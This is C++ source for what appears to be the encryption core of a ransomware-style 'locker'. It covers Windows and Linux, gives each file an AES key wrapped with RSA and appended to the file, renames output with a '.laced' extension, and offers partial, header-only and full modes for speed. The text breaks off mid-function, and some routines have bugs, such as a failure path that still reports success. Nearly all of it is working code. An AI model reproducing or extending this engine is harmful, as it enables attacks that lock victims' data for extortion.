
#ifdef _WIN32
#include <windows.h>
#include <bcrypt.h>
#include <fileapi.h>
#pragma comment(lib, "bcrypt.lib")
#endif


#include <stdio.h>
#include <string>
#include <map>

#include "filesystem.h"
#include "memory.h"
#include "logs.h"
#include "sha/sha256.h"
#include "aes/aes256.h"
#include "rsa/rsa.h"
#include "base64/base64.h"
#include "global_parameters.h"
#include "CommandParser.h"

#ifdef __linux__
#include <sys/stat.h>

#include <openssl/evp.h>
#include <openssl/pem.h>

constexpr int MAX_PATH = 255;

#endif

constexpr unsigned MB = 1048576;

#define ECRYPT_NAME_P T(".laced")
#define ECRYPT_NAME_LEN 6

#define SET(v,w) ((v) = (w))

std::mutex g_MutexBcrypt;

bool filesystem::WriteFullData
(
	DESC hFile,
	LPVOID Buffer,
	unsigned Size
)
{
	DWORD TotalWritten = 0;
#ifdef _WIN32
	DWORD BytesWritten = 0;
#else
	int BytesWritten = 0;
#endif
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{
		if (!api::WriteFile(hFile, (BYTE*)Buffer + Offset, BytesToWrite, &BytesWritten) || !BytesWritten)
		{
			return FALSE;
		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;
	}

	return TRUE;
}

bool filesystem::getParseFile
(
	PFILE_INFO FileInfo
)
{
	if ((FileInfo->FileHandle = api::OpenFile(FileInfo->FilePath)) == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[GetParseFile] Failed File is already open by another program; " log_str, FileInfo->Filename);
		return FALSE;
	}

#ifdef _WIN32
	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(FileInfo->FileHandle, &FileSize))
	{
		LOG_ERROR("[GetParseFile] Failed file must not be empty; " log_str, FileInfo->Filename);
		return FALSE;
	}
	if (!FileSize.QuadPart)
	{
		LOG_ERROR("[GetParseFile] Failed file must not be empty; " log_str, FileInfo->Filename);
		return FALSE;
	}
	FileInfo->Filesize = FileSize.QuadPart;
#else
	struct stat st;
	if (fstat(FileInfo->FileHandle, &st) == -1)
	{
		LOG_ERROR("[GetParseFile] Failed fstat");
		return FALSE;
	}

	FileInfo->Filesize = st.st_size;
#endif

	if(FileInfo->Filesize == 0)
	{
		LOG_ERROR("[GetParseFile] Failed file is empty");
		return FALSE;
	}
	return TRUE;
}

bool filesystem::getParseFile(TCHAR* FilePath, DESC* desc_file, unsigned* filesize)
{
	if ((*desc_file = api::OpenFile(FilePath)) == DESC(-1))
	{
		LOG_ERROR("[GetParseFile] Failed File is already open by another program; " log_str, FilePath);
		return false;
	}
#ifdef _WIN32
	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(*desc_file, &FileSize))
	{
		LOG_ERROR("[GetParseFile] Failed file must not be empty;" log_str, FilePath);
		return FALSE;
	}
	if (!FileSize.QuadPart)
	{
		LOG_ERROR("[GetParseFile] Failed file must not be empty; " log_str, FilePath);
		return FALSE;
	}
	*filesize = FileSize.QuadPart;
#else
	struct stat st;
	if (fstat(*desc_file, &st) == -1)
	{
		LOG_ERROR("[GetParseFile] Failed fstat");
		return false;
	}

	*filesize = st.st_size;
#endif

	return true;
}

bool filesystem::CreateFileOpen(PFILE_INFO FileInfo)
{
#ifdef _WIN32
	FileInfo->newFileHandle = CreateFileW(FileInfo->newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	if (FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[CreateFileOpen] Failed Create File; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}
#else
	FileInfo->newFileHandle = api::CreateFile(FileInfo->newFilename);
	if (FileInfo->newFileHandle == -1)
	{
		LOG_ERROR("[CreateFileOpen] Failed Create File; %s", FileInfo->Filename);
		return FALSE;
	}
#endif
	return TRUE;
}

bool filesystem::CreateFileOpen(DESC* desc_file, TCHAR* filename)
{
#ifdef _WIN32
	* desc_file = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (desc_file == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[CreateFileOpen] Failed Create File; %ls; GetLastError = %lu", filename, GetLastError());
		return FALSE;
	}
#else
	if ((*desc_file = api::CreateFile(filename)) == -1)
	{
		LOG_ERROR("[CreateFileOpen] Failed Create File; %s", filename);
		return false;
	}
#endif
	return true;
}



static bool EncryptFileFullData(PFILE_INFO FileInfo)
{
	BOOL success = FALSE;
	DWORD BytesRead = FileInfo->Filesize;
	size_t dwread = 0;
	DWORD padding = 0;
	bool isAes = FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256
		|| FileInfo->CryptInfo->method_policy == CryptoPolicy::RSA_AES256;
	if (isAes && FileInfo->dcrypt == (int)EncryptCipher::CRYPT)
		padding = aes256_padding(BytesRead) - BytesRead;
		

	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + AES_BLOCK_SIZE);
	if (!FileBuffer)
	{
		LOG_ERROR("[EncryptFileFullData] Large File Size. Buffer heap crash; " log_str, FileInfo->Filename);
		goto end;
	}

	if (!api::ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to ReadFile; " log_str, FileInfo->Filename);
		goto end;
	}

	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);
	
	if(isAes && FileInfo->dcrypt == (int)EncryptCipher::DECRYPT)
	{
		memory::memzero_explicit(&FileBuffer[FileInfo->Filesize - FileInfo->padding], FileInfo->padding);
		FileInfo->Filesize -= FileInfo->padding;
		BytesRead -= FileInfo->padding;
	}

	if (!filesystem::WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to write; " log_str, FileInfo->Filename);
		goto end;
	}

	success = TRUE;
end:
	if (FileBuffer) memory::m_free(FileBuffer);
	return TRUE;
}


static bool EncryptFilePartly
(
	PFILE_INFO FileInfo,
	BYTE DataPercent
)
{
	BOOL success = FALSE;
	DWORD multiply = 0;
	size_t BytesRead;
	size_t BytesReadW;
	LONGLONG TotalRead;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	int StepsCount = 0;
	LONGLONG Size = FileInfo->Filesize;

	switch (DataPercent)
	{
	case 20:
		PartSize = (Size / 100) * 7;
		StepsCount = 3;
		StepSize = (Size - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (Size / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}

	BOOL isAes = FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256
		|| FileInfo->CryptInfo->method_policy == CryptoPolicy::RSA_AES256;
	if (isAes)
	{
		if (PartSize < AES_BLOCK_SIZE)
		{
			LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->Filename);
			return FALSE;
		}
		multiply = PartSize % 16;
	}


	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
	if (!BufferPart || !BufferStep)
	{
		LOG_ERROR("[EncryptFilePartly] Large File Size. Buffer heap crash; " log_str, FileInfo->Filename);
		return FALSE;
	}

	for (int i = 0; i < StepsCount; ++i)
	{
		if (!api::ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead) || !BytesRead)
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Read Data; " log_str, FileInfo->FilePath);
			goto end;
		}

		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);

		if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->FilePath);
			goto end;
		}
		TotalRead = 0;
		while (TotalRead < StepSize)
		{
			if (!api::ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
				break;
			if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
				break;
			TotalRead += BytesReadW;
		}
	}

	success = TRUE;

end:
	if (BufferPart)
		memory::m_free(BufferPart);
	if (BufferStep)
		memory::m_free(BufferStep);

	return success;
}

static bool EncryptFileBlock
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	size_t BytesRead;
	u32 padding = 0;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE);

	while (api::ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
	{
		if (BytesRead < 1048576 && FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256)
		{
			padding = BytesRead % 16;
			BytesRead -= padding;
		}

		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);

		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
		{
			LOG_ERROR("[EncryptFileBlock] [WriteFullData] Failed");
			goto end;
		}
	}

	success = TRUE;
end:
	memory::m_free(Buffer);
	return TRUE;
}

static bool EncryptFileHeader
(
	PFILE_INFO FileInfo
)
{
	if (FileInfo->Filesize < 1048576)
	{
		LOG_ERROR("[EncryptFileHeader] FileSize must be > 1.0 MB; " log_str, FileInfo->Filename);
		return FALSE;
	}

	BOOL success = FALSE;
	DWORD BytesEncrypt = 1048576;
	size_t BytesRead;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
	if (!Buffer)
	{
		LOG_ERROR("Heap Crash");
		return FALSE;
	}
	if (!api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead))
	{
		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->Filename);
		goto end;
	}

	if (BytesRead == 0)
	{
		LOG_ERROR("[EncryptFileHeader] Unexpected BytesRead");
		goto end;
	}

	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);

	if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
	{
		LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
		goto end;
	}

	while (api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
	{
		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
		{
			LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
			goto end;
		}
	}

	success = TRUE;

end:
	memory::m_free(Buffer);
	return success;
}

bool filesystem::OptionEncryptModeAUTO(PFILE_INFO FileInfo)
{
	if (FileInfo->Filesize <= 1048576)
	{
		if (!EncryptFileFullData(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->Filename);
			return FALSE;
		}
	}
	else if (FileInfo->Filesize <= 5242880)
	{
		if (!EncryptFilePartly(FileInfo, 20))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->Filename);
			return FALSE;
		}
	}
	else
	{
		if (!EncryptFileHeader(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->Filename);
			return FALSE;
		}
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeFULL(PFILE_INFO FileInfo)
{
	if (!EncryptFileFullData(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModePARTLY(PFILE_INFO FileInfo)
{
	if (!EncryptFilePartly(FileInfo, 20))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeHEADER(PFILE_INFO FileInfo)
{
	if (!EncryptFileHeader(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeBLOCK(PFILE_INFO FileInfo)
{
	if (!EncryptFileBlock(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileBlock]; " log_str, FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::ReadRSAFile
(
	CRYPT_INFO* CryptInfo
)
{
	BOOL success = FALSE;
	DESC hCryptFile = INVALID_HANDLE_VALUE;
	size_t dwread;
#ifdef _WIN32
	NTSTATUS status;
#endif
	DWORD resByte = 0;

	unsigned filesize;
	if (!getParseFile(CryptInfo->desc.rsa_path, &hCryptFile, &filesize))
	{
		LOG_ERROR("[ReadRSAFile] Failed Open key file; " log_str, CryptInfo->desc.rsa_path);
		return FALSE;
	}

	CryptInfo->desc.size = filesize;
	if (!api::ReadFile(hCryptFile, CryptInfo->desc.key_data, CryptInfo->desc.size, &dwread) || dwread != filesize)
	{
		LOG_ERROR("[ReadRSAFile] Failed Key ReadFile; " log_str, CryptInfo->desc.rsa_path);
		return FALSE;
	}

#ifdef _WIN32
	if (!HandleError(
		BCryptOpenAlgorithmProvider(&CryptInfo->desc.crypto_provider, BCRYPT_RSA_ALGORITHM, NULL, 0)
	))
	{
		LOG_ERROR("[BCryptOpenAlgorithmProvider] Failed");
		return FALSE;
	}

	CONST WCHAR* bcrpyt_blob = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT ? BCRYPT_RSAPUBLIC_BLOB : BCRYPT_RSAPRIVATE_BLOB;

	if (GLOBAL_STATE.g_RsaBase64)
	{
		int bsize;
		char* buffer = (char*)memory::m_malloc(4096);
		void* ptr = CryptInfo->desc.key_data;
		if (!base64::base64(BASE_E::DECODE, CryptInfo->desc.key_data, CryptInfo->desc.size, buffer, &bsize))
			goto END;
		memory::m_free(ptr);
		CryptInfo->desc.key_data = (BYTE*)buffer;
		CryptInfo->desc.size = bsize;

		if (!HandleError
		(
			BCryptImportKeyPair(CryptInfo->desc.crypto_provider,
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
				bsize, 0))
			)
		{
			LOG_ERROR("[ReadRSAFile] [BCryptImportKeyPair] Failed");
			goto END;
		}
	}
	else
	{
		if (!HandleError
		(
			BCryptImportKeyPair
			(
				CryptInfo->desc.crypto_provider,
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
				CryptInfo->desc.size, 0
			)
		))
		{
			LOG_ERROR("[ReadRSAFile] [BCryptImportKeyPair] Failed");
			LOG_INFO("[ReadRSAFile] if key in format Base64 - check flag -B64");
			goto END;
		}
	}

	status = BCryptGetProperty
	(
		CryptInfo->desc.handle_rsa_key,
		BCRYPT_KEY_LENGTH,
		(PUCHAR)&CryptInfo->desc.size,
		sizeof(CryptInfo->desc.size),
		&resByte,
		0
	);
	if (!HandleError(status) || resByte != 4)
	{
		LOG_ERROR("[ReadRSAFile] Failed Get size");
		goto END;
	}
	if ((CryptInfo->desc.size /= 8) % 8 != 0)
	{
		LOG_ERROR("[ReadRSAFile] Invalid Size");
		goto END;
	}
#else

	if (GLOBAL_STATE.g_RsaBase64)
	{
		int bsize;
		char* buffer = (char*)memory::m_malloc(4096);
		void* ptr = CryptInfo->desc.key_data;
		if (!base64::base64(BASE_E::DECODE, CryptInfo->desc.key_data, CryptInfo->desc.size, buffer, &bsize))
			goto END;
		memory::m_free(ptr);
		CryptInfo->desc.key_data = (BYTE*)buffer;
		CryptInfo->desc.size = bsize;
	}
	
	if (!(CryptInfo->desc.bio = BIO_new_mem_buf(CryptInfo->desc.key_data, CryptInfo->desc.size)))
	{
		LOG_ERROR("[ReadRSAFile] Failed create BIO");
		err();
		goto END;
	}

	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT &&
		!(CryptInfo->desc.PKEY = d2i_PUBKEY_bio(CryptInfo->desc.bio, NULL)))
	{
		LOG_ERROR("[ReadRSAFile] Failed load DER key");
		err();
		goto END;
	}
	else if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT &&
		!(CryptInfo->desc.PKEY = d2i_PrivateKey_bio(CryptInfo->desc.bio, NULL)))
	{
		LOG_ERROR("[ReadRSAFile] Failed load DER key");
		err();
		goto END;
	}

#endif



	success = TRUE;
END:
	if (hCryptFile != INVALID_HANDLE_VALUE)
		api::CloseDesc(hCryptFile);
	return success;
}


/*	ONLY RSA & ONLY (RSA_BYTE - 11) => FILESIZE	*/
bool filesystem::EncryptRSA
(
	PFILE_INFO FileInfo
)
{
	bool success = false;
	bool g_decrypt = FileInfo->dcrypt == (int)EncryptCipher::DECRYPT ? true : false;
	bool g_crypt = FileInfo->dcrypt == (int)EncryptCipher::CRYPT ? true : false;
	if (g_crypt && FileInfo->Filesize > FileInfo->CryptInfo->desc.size - 11)
	{
		LOG_ERROR("[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); " log_str, FileInfo->Filename);
		return false;
	}
	else if (g_decrypt && FileInfo->Filesize > FileInfo->CryptInfo->desc.size)
	{
		LOG_ERROR("[EncryptRSA] Invalid Size File < RSA_BYTE; " log_str, FileInfo->Filename);
		return false;
	}

	size_t size = 0;
	DWORD dwDataLen = 0;
	BYTE* FileBuffer = NULL;
	FileBuffer = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
	BYTE* Buffer = NULL;
	if (!api::ReadFile(FileInfo->FileHandle, FileBuffer, FileInfo->Filesize, &size) || FileInfo->Filesize != size)
	{
		LOG_ERROR("[EncryptRSA] Failed File ReadFile; " log_str, FileInfo->Filename);
		goto END;
	}

#ifdef _WIN32
	if (g_crypt)
	{
		if (!HandleError
		(
			BCryptEncrypt
			(
				FileInfo->CryptInfo->desc.handle_rsa_key,
				FileBuffer, FileInfo->Filesize,
				NULL, NULL, 0,
				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR("[CryptEncrypt] Failed; %ls", FileInfo->Filename);
			goto END;
		}
	}
	else if (g_decrypt)
	{
		if (!HandleError
		(
			BCryptDecrypt
			(
				FileInfo->CryptInfo->desc.handle_rsa_key,
				FileBuffer, FileInfo->CryptInfo->desc.size,
				NULL, NULL, 0,
				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen,
				BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR("[BCryptDecrypt] Failed");
			goto END;
		}
	}
	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, dwDataLen))
	{
		LOG_ERROR("[WriteFullData] Failed to write");
		goto END;
	}
#else
	if (g_crypt && !rsa::EncryptRSA
	(
		FileInfo->CryptInfo->desc.bio,
		FileInfo->CryptInfo->desc.PKEY,
		FileInfo->CryptInfo->desc.ctx,
		FileBuffer,
		&size,
		&Buffer
	))
	{
		LOG_ERROR("[EncryptRSA] Encrypt failed");
		err();
		goto END;
	}
	else if (g_decrypt && !rsa::DecryptRSA
	(
		FileInfo->CryptInfo->desc.bio,
		FileInfo->CryptInfo->desc.PKEY,
		FileInfo->CryptInfo->desc.ctx,
		FileBuffer,
		&size,
		&Buffer
	))
	{
		LOG_ERROR("[EncryptRSA] Decrypt failed");
		err();
		goto END;
	}
	if (!WriteFullData(FileInfo->newFileHandle, Buffer, size))
	{
		LOG_ERROR("[WriteFullData] Failed to write");
		goto END;
	}
#endif


	success = TRUE;

END:
#ifdef __linux__
	if (FileInfo->CryptInfo->desc.ctx)
		EVP_PKEY_CTX_free(FileInfo->CryptInfo->desc.ctx);
	if (Buffer)
		memory::m_free(Buffer);
#endif
	if (FileBuffer)
	{
		memory::memzero_explicit(FileBuffer, dwDataLen);
		memory::m_free(FileBuffer);
	}

	return success;
}




static bool GenKey
(
	PFILE_INFO FileInfo,
	BYTE* CryptKey,
	BYTE* CryptIV,
	BYTE* EncryptedKey,
	unsigned* sz
)
{
	DWORD writeData = 0;
#ifdef _WIN32
	if (!HandleError
	(BCryptGenRandom(0, CryptKey, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR("[BCryptGenRandom] Failed");
		return FALSE;
	}

	if (!HandleError
	(BCryptGenRandom(0, CryptIV, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR("[BCryptGenRandom] Failed");
		return FALSE;
	}
#else
	if (!RAND_bytes(CryptKey, 32) || !RAND_bytes(CryptIV, 8))
	{
		LOG_ERROR("[RAND_bytes] Failed");
		err();
		return false;
	}
#endif

	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);

	memory::Copy(EncryptedKey, CryptKey, 32);
	memory::Copy(EncryptedKey + 32, CryptIV, 8);

#ifdef _WIN32
	if (!HandleError
	(
		BCryptEncrypt
		(
			FileInfo->CryptInfo->desc.handle_rsa_key,
			EncryptedKey, 40,
			NULL, NULL, 0,
			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR("[BCryptEncrypt] Failed");
		return FALSE;
	}
	*sz = writeData;
#else
	unsigned ksize = 40;
	BYTE* crypted = NULL;
	if (!rsa::EncryptRSA
	(
		FileInfo->CryptInfo->desc.bio,
		FileInfo->CryptInfo->desc.PKEY,
		FileInfo->CryptInfo->desc.ctx,
		EncryptedKey,
		&ksize,
		&crypted
	))
	{
		LOG_ERROR("[EncryptRSA] Encrypt failed");
		return false;
	}

	if (crypted)
	{
		memory::memzero_explicit(EncryptedKey, 40);
		memcpy(EncryptedKey, crypted, ksize);
		memory::m_free(crypted);
		*sz = ksize;
	}
#endif

	return TRUE;
}


static bool WriteEncryptInfo
(
	PFILE_INFO FileInfo,
	BYTE* EncryptedKey,
	unsigned EKsize,
	EncryptModes EncryptMode
)
{

	BYTE Buffer[4] = { 0 };
	Buffer[0] = static_cast<int>(EncryptMode) + 100;
	std::string strbit = std::to_string(EKsize);
	memcpy(&Buffer[1], strbit.c_str(), 3);

#ifdef _WIN32
	LARGE_INTEGER Offset;
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(FileInfo->newFileHandle, Offset, NULL, FILE_END)
		|| !filesystem::WriteFullData(FileInfo->newFileHandle, EncryptedKey, FileInfo->CryptInfo->desc.size)
		|| !filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, 4))
	{
		LOG_ERROR("[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

#else
	int Offset = 0;
	if (!api::SetPointOff(FileInfo->newFileHandle, Offset, SEEK_END)
		|| !filesystem::WriteFullData(FileInfo->newFileHandle, EncryptedKey, EKsize)
		|| !filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, 4))
	{
		LOG_ERROR("[WriteEncryptInfo] Failed to set point");
		return false;
	}
#endif

	return TRUE;
}

bool filesystem::FileCryptEncrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	EncryptModes mode = GLOBAL_ENUM.g_EncryptMode;
	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
	BYTE CryptIV[8];
	BYTE CryptKey[32];
	unsigned ksize;

	if (!GenKey(FileInfo, CryptKey, CryptIV, EncryptedKey, &ksize))
	{
		LOG_ERROR("[GenKey] Failed to generate key;");
		goto END;
	}

	if (!FileInfo->CryptInfo->mode_method(FileInfo))
		goto END;

	WriteEncryptInfo(FileInfo, EncryptedKey, ksize, mode);

	success = TRUE;
END:
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, FileInfo->CryptInfo->desc.size);
		memory::memzero_explicit(CryptIV, 8);
		memory::memzero_explicit(CryptKey, 32);
		memory::m_free(EncryptedKey);
	}

	return success;
}



static BYTE* ReadEncryptInfo
(
	DESC handle,
	DWORD* Bit
)
{
	BYTE ReadInfo[4];

#ifdef _WIN32
	LARGE_INTEGER Offset;
	Offset.QuadPart = -4;

	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END)
		|| !ReadFile(handle, ReadInfo, 4, NULL, NULL))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
#else
	unsigned read;
	if (!api::SetPointOff(handle, -4, SEEK_END)
		|| !api::ReadFile(handle, ReadInfo, 4, &read))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
		return NULL;
	}
#endif

	int mode = ReadInfo[0] - 100;
	int size_bit = 0;
	for (int i = 1; i < 4; ++i)
	{
		if(ReadInfo[i] >= '0' && ReadInfo[i] <= '9')
			size_bit = size_bit * 10 + (ReadInfo[i] - '0');
		else
		{
			LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
			return NULL;
		}
	}
	BYTE* read_key = (BYTE*)memory::m_malloc(size_bit);
#ifdef _WIN32
	Offset.QuadPart = -(size_bit + 4);
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END)
		|| !ReadFile(handle, read_key, size_bit, NULL, NULL))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_BEGIN))
		return NULL;
#else
	if (!api::SetPointOff(handle, -(size_bit + 4), SEEK_END)
		|| !api::ReadFile(handle, read_key, size_bit, &read)
		|| !api::SetPoint(handle, SEEK_SET))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
		return NULL;
	}
#endif

	* Bit = size_bit;
	return read_key;
}


bool filesystem::FileCryptDecrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	DWORD EncryptedKeySize = 0;
	DWORD written;
	BYTE* Buffer = NULL;
	BYTE CryptIV[8];
	BYTE CryptKey[32];
	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->FileHandle, &EncryptedKeySize);
	if (EncryptedKey == NULL)	goto END;
	FileInfo->Filesize -= EncryptedKeySize + 4;
	
#ifdef _WIN32
	if (SetFilePointer(FileInfo->FileHandle, FileInfo->Filesize, NULL, FILE_BEGIN))
	{
		SetEndOfFile(FileInfo->FileHandle);
		SetFilePointer(FileInfo->FileHandle, 0, NULL, FILE_BEGIN);
	}

	if (!HandleError
	(
		BCryptDecrypt(FileInfo->CryptInfo->desc.handle_rsa_key,
			EncryptedKey, FileInfo->CryptInfo->desc.size,
			NULL, NULL, 0,
			EncryptedKey, 40, &written,
			BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR("[BCryptDecrypt] Failed");
		goto END;
	}
	memory::Copy(CryptKey, EncryptedKey, 32);
	memory::Copy(CryptIV, EncryptedKey + 32, 8);
#else
	if (ftruncate(FileInfo->FileHandle, FileInfo->Filesize) == -1)
	{
		LOG_ERROR("Failed truncate key");
		goto END;
	}

	if (!rsa::DecryptRSA
	(
		FileInfo->CryptInfo->desc.bio,
		FileInfo->CryptInfo->desc.PKEY,
		FileInfo->CryptInfo->desc.ctx,
		EncryptedKey,
		&EncryptedKeySize,
		&Buffer
	))
	{
		LOG_ERROR("[FileCryptDecrypt] Decrypt failed");
		goto END;
	}
	memory::Copy(CryptKey, Buffer, 32);
	memory::Copy(CryptIV, Buffer + 32, 8);
#endif

	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);

	success = FileInfo->CryptInfo->mode_method(FileInfo);

END:
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, EncryptedKeySize);
		memory::memzero_explicit(CryptKey, 32);
		memory::memzero_explicit(CryptIV, 8);
		memory::m_free(EncryptedKey);
	}
#ifdef __linux__
	if (Buffer)
	{
		memory::memzero_explicit(Buffer, EncryptedKeySize);
		memory::m_free(Buffer);
	}
#endif

	return success;
}

STATIC VOID dump_hash(CONST BYTE* hash, size_t len)
{
	std::lock_guard<std::mutex> lock(g_MutexBcrypt);
	for (size_t i = 0; i < len; ++i) printf("%02X", hash[i]);
	printf("\n");
}


void filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
{
	SLIST<locker::HLIST>* list_sorted = new SLIST<locker::HLIST>;
	std::multimap<u32, BYTE*> map;
	locker::PHLIST DataHash = NULL;
	SLIST_FOREACH(DataHash, list)
		map.insert({ memory::MurmurHash2A(DataHash->hash, 32, 0), DataHash->hash });

	for (auto& e : map)
	{
		locker::PHLIST hash_sorted = new locker::HLIST;
		hash_sorted->hash = e.second;
		hash_sorted->hash_size = 32;
		list_sorted->SLIST_INSERT_HEAD(hash_sorted);
	}

	*list = *list_sorted;
	delete list_sorted;
}


bool filesystem::nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, TCHAR* Filename)
{
	return true;
}


bool filesystem::HashSumFile(PCRYPT_INFO CryptInfo, DESC desc_file, TCHAR* Filename)
{
	BYTE* buff_hash = (BYTE*)memory::m_malloc(MB);
	size_t BytesRead;
	BYTE* out = (BYTE*)memory::m_malloc(32);
	api::SetPoint(desc_file, SEEK_SET);
	sha256_state ctx;
	sha256_init_context(&ctx);
	while (api::ReadFile(desc_file, buff_hash, 1048576, &BytesRead) && BytesRead != 0)
		sha256_update_context(&ctx, buff_hash, BytesRead);
	sha256_final_context(&ctx, out);

	PHASH_LIST hash = new HASH_LIST;
	hash->Filename = Filename;
	LOG_SUCCESS("%s", hash->Filename);
	hash->hash = out;
	hash->hash_size = 32;
